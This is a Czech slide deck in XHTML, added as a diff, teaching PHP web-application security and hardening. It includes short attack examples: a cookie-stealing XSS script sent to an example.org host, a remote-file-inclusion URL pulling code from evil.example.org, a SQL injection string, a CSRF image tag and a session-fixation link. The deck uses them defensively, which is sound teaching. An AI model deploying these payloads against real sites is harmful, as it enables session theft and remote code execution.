@@ -1,0 +1,398 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"> 
+<head> 
+  <title>Slide Shows in XHTML</title> 
+  <meta name="copyright" content="Copyright &#169; 2010 LMC" />
+  
+  <link rel="stylesheet" type="text/css" media="screen, projection, print" 
+   href="http://www.w3.org/Talks/Tools/Slidy/slidy.css" /> 
+  <script src="http://www.w3.org/Talks/Tools/Slidy/slidy.js" 
+   charset="utf-8" type="text/javascript"></script> 
+   
+   <link rel="stylesheet" type="text/css" media="screen, projection, print"
+ href="http://www.w3.org/Talks/Tools/Slidy/w3c-blue2.css" /> 
+
+ 
+
+  <style type="text/css">    
+    h1 span { font-size: 60%; font-style: italic; }
+    div.slide h1 { margin-top: .5em; height: 1.8em; min-height: 1.8em;}
+    table { border-collapse: collapse; }
+    td,th { border:1px solid gray; }
+  </style> 
+</head>
+<body>
+
+    <div class="background">
+        <img id="head-icon" alt="graphic with four colored squares"
+             src="Slidy/icon-blue.png" /> 
+    </div>
+
+<div class="slide cover">
+    <h1>PHP nejen pro vyvojáře<br />
+    <span>Ladislav Prskavec ladislav.prskavec@lmc.eu</span>
+    </h1>
+<ol>
+    <li>Zapomeňte na PHP4 (podpora ukončena 2007), PHP 5.0 a 5.1</li>
+    <li>Koncepty a praxe</li>
+    <li>Bezpečnost webových stránek</li>
+    <li>Databázovou bezpečnost</li>
+    <li>Bezpečnost session</li>
+    <li>Bezpečnost filesystému</li>
+    <li>Sdílené hostingy</li>
+</ol>
+
+</div>
+
+<div class="slide">
+    <h1>Zapomeňte na PHP4</h1>
+
+    <ul>
+        <li>PHP 4 podpora ukončena 2007, PHP 5.0 a 5.1</li>
+        <li>Aktuálně udržované větve jsou 5.2 a 5.3
+            <ul>
+                <li>PHP 5.2.13</li>
+                <li>PHP 5.3.2</li>
+            </ul>
+        </li>
+    </ul>
+</div>
+
+<div class="slide">
+    <h1>Koncepty a praxe</h1>
+
+    <ul>
+        <li>Nevěřte všem vstupům</li>
+        <li>Filter Input</li>
+        <li>Escape Output</li>
+        <li>Register globals</li>
+    </ul>
+</div>
+
+
+<div class="slide">
+    <h1>Filter Input</h1>
+
+<pre class="jush"><xmp><form method="post">
+   <label for="username">Username:</label><input type="text" name="username" />
+   <label for="password">Password:</label><input type="text" name="password" />
+   <label for="color">Select:</label><select name="colour">
+                                            <option>Red</option>
+                                            <option>Blue</option>
+                                     </select>
+   <input type="submit" />
+</form></xmp></pre>
+
+<pre class="jush-php"><xmp>// c_type extension
+$clean = array();
+if (c_type_aplha($_POST['username']) {
+    $clean['username'] = $_POST['username'];
+}
+// filter
+$args = array('username' => FILTER_SANITIZE_STRING, ...);
+$myinputs = filter_input_array(INPUT_POST, $args);
+</xmp></pre>
+    <ul>
+        <li><a href="http://cz.php.net/manual/en/filter.filters.validate.php">Validate filters</a></li>
+        <li><a href="http://cz.php.net/manual/en/filter.filters.sanitize.php">Sanitize filters</a></li>
+    </ul>
+</div>
+
+
+<div class="slide">
+    <h1>Escape Output</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>kontext</th>
+
+                <th>escapovací funkce</th>
+
+                <th>reverzní funkce</th>
+            </tr>
+
+        </thead>
+
+        <tbody>
+            <tr>
+                <td>HTML</td>
+
+                <td><a href="http://php.net/htmlspecialchars">htmlspecialchars</a></td>
+
+                <td><a href="http://php.net/html_entity_decode">html_entity_de­code</a></td>
+            </tr>
+
+
+            <tr>
+                <td>XML</td>
+
+                <td><a href="http://php.net/htmlspecialchars">htmlspecialchars</a></td>
+
+                <td>—</td>
+            </tr>
+
+            <tr>
+                <td>regulární výraz</td>
+
+
+                <td><a href="http://php.net/preg_quote">preg_quote</a></td>
+
+                <td>—</td>
+            </tr>
+
+            <tr>
+                <td>PHP řetězce</td>
+
+                <td><a href="http://php.net/var_export">var_export</a></td>
+
+                <td>—</td>
+
+            </tr>
+
+            <tr>
+                <td>MySQL databáze</td>
+
+                <td><a href="http://php.net/mysql_real_escape_string">mysql_real_es­cape_string</a></td>
+
+                <td>—</td>
+            </tr>
+
+            <tr>
+
+                <td>MySQL improved</td>
+
+                <td><a href="http://php.net/manual/en/mysqli.real-escape-string.php">mysqli_real_es­cape_string</a></td>
+
+                <td>—</td>
+            </tr>
+
+            <tr>
+                <td>SQLite databáze</td>
+
+                <td><a href="http://php.net/sqlite_escape_string">sqlite_escape_string</a></td>
+
+
+                <td>—</td>
+            </tr>
+
+            <tr>
+                <td>PostgreSQL databáze</td>
+
+                <td><a href="http://php.net/pg_escape_string">pg_escape_string</a></td>
+
+                <td>—</td>
+            </tr>
+
+
+            <tr>
+                <td>PostgreSQL, typ bytea</td>
+
+                <td><a href="http://php.net/pg_escape_bytea">pg_escape_bytea</a></td>
+
+                <td><a href="http://php.net/pg_unescape_bytea">pg_unescape_bytea</a></td>
+            </tr>
+
+            <tr>
+                <td>JavaScript, JSON</td>
+
+
+                <td><a href="http://php.net/json_encode">json_encode</a></td>
+
+                <td><a href="http://php.net/json_decode">json_decode</a></td>
+            </tr>
+
+            <tr>
+                <td>CSS</td>
+
+                <td><a href="http://php.net/addcslashes">addcslashes</a></td>
+
+                <td>—</td>
+
+            </tr>
+
+            <tr>
+                <td>URL</td>
+
+                <td><a href="http://php.net/rawurlencode">rawurlencode</a></td>
+
+                <td><a href="http://php.net/urldecode">urldecode</a></td>
+            </tr>
+        </tbody>
+
+    </table>
+    <p>Kompletní vysvětlení viz <a href="http://phpfashion.com/escapovani-definitivni-prirucka">http://phpfashion.com/escapovani-definitivni-prirucka</a></p>
+</div>
+
+    <div class="slide">
+        <h1>Register globals</h1>
+        <pre class="jush-php"><xmp>if (checkLogin()) {
+    $loggedin = TRUE;
+}
+
+if ($loggedin) {
+    // do stuff only for logged in users
+} </xmp></pre>
+
+        <p>Pokud jsou <code class="jush-phpini">register_globals = on</code>, lze lehce tento kod překonat pomocí předání v <code>$_GET</code></p>
+        <pre class="jush">
+        http://localhost/?loggedin=1</pre>
+
+		<p>V php.ini je register_globals od 4.2 standardně vypnuté, ale určitě je dobré to zkontrolovat a určitě nepoužívat software, který register globals vyžaduje zapnuté.</p>
+		<p>V PHP 5.3 je register_globals označeno jako DEPRECATED, podobně jako další directivy (<code class="jush-phpini">register_long_arrays, auto_globals_jit</code>).
+    </div>
+
+<div class="slide">
+    <h1>Bezpečnost webových stránek</h1>
+
+    <ul>
+        <li>Spoofed Forms</li>
+            <ul>
+                <li>překonáte lehce konroly na straně klienta (JS validace, formlářové validace v browseru)</li>
+				<li>je dobré se bránit například pomocí kontroly <code class="jush-php">$_SERVER['REFERER']</code> </li>
+            </ul>       
+        <li>Cross-site scripting</li>
+            <ul>
+                <li>nepřátelský kód vložený například do komentáře (JS, který odesílá například cookies)</li>
+                <pre class="jush-js"><xmp><script>
+document.location = "http://example.org/getcookies.php?cookies=" + document.cookie;
+</script>
+</xmp></pre>
+            </ul>
+        <li>Cross-site request forgery (CFRF)</li>
+        <ul>
+            <li>nepřátelský kód může být součástí například obrázku. Kód provede nákup aniž by to uživatel věděl.</li>
+        <pre class="jush"><xmp><img src="http://example.org/checkout.php?isbn=0312863551&qty=1" /></xmp></pre>
+			<li>obrana je celkem jednoduchá pokud, do <code class="jush-php">$_SESSION</code> můžete ukádat token, který se při operaci kontroluje a nikdo z jiného serveru podobnou operaci neprovede.</li>
+        </ul>
+    </ul>
+</div>
+
+<div class="slide">
+    <h1>Databázovou bezpečnost</h1>
+
+    <ul>
+        <li>SQL injection</li>
+        <pre class="jush-php"><xmp>// kontrola formulare
+$username = $_POST['username'];
+$password = sha1($_POST['password');
+$sql = "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'";
+/* database query */
+if (count($result)>0) {
+// login sucessful
+}
+</xmp></pre>
+		<li>pokud někdo podstčí do formuláře <pre class="jush-sql">username' OR 1=1</pre> a prázdné heslo</li>
+        <pre class="jush-sql"><xmp>SELECT * FROM `users` WHERE `username` = 'username' OR 1=1 AND `password` = 'a4degf...' </xmp></pre>
+        <li>toto SQL je vždy true a je potřeba buď důsledně dělat escape string, pro vaši databázi.</li>
+    </ul>
+</div>
+
+
+<div class="slide">
+    <h1>Bezpečnost session</h1>
+
+    <ul>
+        <li>Session fixation</li>
+        <ul>
+        <pre class="jush"><xmp><a href="http://example.org/index.php?PHPSESSID=1234">Click here</a></xmp></pre>
+        <li>po zalogování není na škodu měnit session id</li>
+        <pre class="jush-php"><xmp>if (authenticate()) {
+session_regenerate_id();
+}</xmp></pre>
+        </ul>
+        <li>Session hijacking</li>
+        <ul>
+        <pre class="jush-php"><xmp>// after login
+$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT']</xmp></pre>
+        <li>Při nahrání stránek není problém potom kontrolovat i user agent</li>
+        <pre class="jush-php"><xmp>if ($_SESSION['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
+ // prinute uzivatele znovu se zalogovat
+} </xmp></pre>
+        </ul>
+    </ul>
+</div>
+
+
+<div class="slide">
+    <h1>Bezpečnost filesystému</h1>
+
+    <ul>
+        <li>Remote code injection</li>
+        <ul>
+            <li>Pokud php obsahuje např.</li>
+            <pre class="jush-php"><xmp>include "{$_GET['section']}/data.inc.php";</xmp></pre>
+            <li>můžete pomocí útoku</li>
+            <pre class="jush"><xmp>http://example.org/?section=http%3A%2F%2Fevil.example.org%2Fattack.inc%3F</xmp></pre>
+            <li>lehce spustit svůj kód, protože cílový server ho krásně načte.</li>
+            <pre class="jush-php"><xmp>include "http://evil.example.org/attack.inc?/data.inc.php</xmp></pre>
+            <li>správné řešení by mělo kontrolovat výčet vstupů, které jste definovali a nepřebírat to jen tak.</li>
+        </ul>
+        <li>Command injection</li>
+        <ul>
+			<li>cizí kód obvykle obsahuje <code class="jush-php">exec(), system(), passthru(),</code> které se dají zakázat pokud je nepoužíváme.</li>
+			<li>lepší je použít <code class="jush-php">escapeshellcmd() a escapeshellarg()</code>, kde se escapuje výstup z shellu</li>
+        </ul>
+    </ul>
+</div>
+
+<div class="slide">
+    <h1>Sdílené hostingy</h1>
+
+    <ul>
+        <li>na sdéleném hostingu, hrozí největší riziko od ostatních uživatelů hostingu</li>
+        <li><code class="jush-phpini">open_basedir, disable_functions, disable_classes</code> jsou nezbytné pro dobré nastavení serveru</li>
+        <pre class="jush">
+; Disable functions
+disable_functions = exec,passthru,shell_exec,system
+; Disable classes
+disable_classes = DirectoryIterator,Directory</pre>
+        <li>vhodným nastavením adresářů se dá také předejít mnoha problémům</li>
+        <pre class="jush">
+    /var/www/ --x
+            example.org_gr7a1e r-x
+                private r-x
+                public r-x
+                    data rwx
+                temp rwx</pre>
+    </ul>
+</div>
+
+    <div class="slide">
+        <h1>Principy programování KISS, DRY</h1>
+        <ul>
+			<li><a href="http://en.wikipedia.org/wiki/KISS_principle">KISS</a> (keep it short and simple)</li>
+			<li><a href="http://en.wikipedia.org/wiki/DRY">DRY</a> (don't repeat yourself)</li>
+			<li><a href="http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller">MVC</a> (model - view - controller architektura)</li>
+			<li>bezpečnost (<a href="http://phpsec.org/">phpsec.org</a>, <a href="http://framework.zend.com/security/advisories">ZF Security</a>)</li>
+        </ul>
+        <br />
+        <ul>
+            <li>Frameworky</li>
+            <ul>
+				<li><a href="http://nettephp.com">Nette Framework</a> - AJAX  / AJAJ, SEO, DRY, KISS, MVC (podpora jQuery)</li>
+				<li><a href="http://framework.zend.com">Zend Framework</a> - MVC, integrace s jQuery / Dojo</li>
+				<li><a href="http://cakephp.org">CakePHP</a> - MVC, ORM</li>
+				<li><a href="http://solarphp.com">SolarPHP</a> - MVC, Table Data Gateway, Data Mapper</li>
+            </ul>
+        </ul>
+
+    </div>
+
+
+    <div class="slide">
+        <h1>Děkuji za pozornost</h1>
+        <ul>
+            <li>Otázky?</li>
+        </ul>
+    </div>
+	<script type="text/javascript" src="http://jush.sourceforge.net/jush.js"></script>
+	<script type="text/javascript">
+		jush.style('http://jush.sourceforge.net/jush.css');
+		jush.highlight_tag('pre');
+		jush.highlight_tag('code');
+	</script>
+</body>
+</html>
+
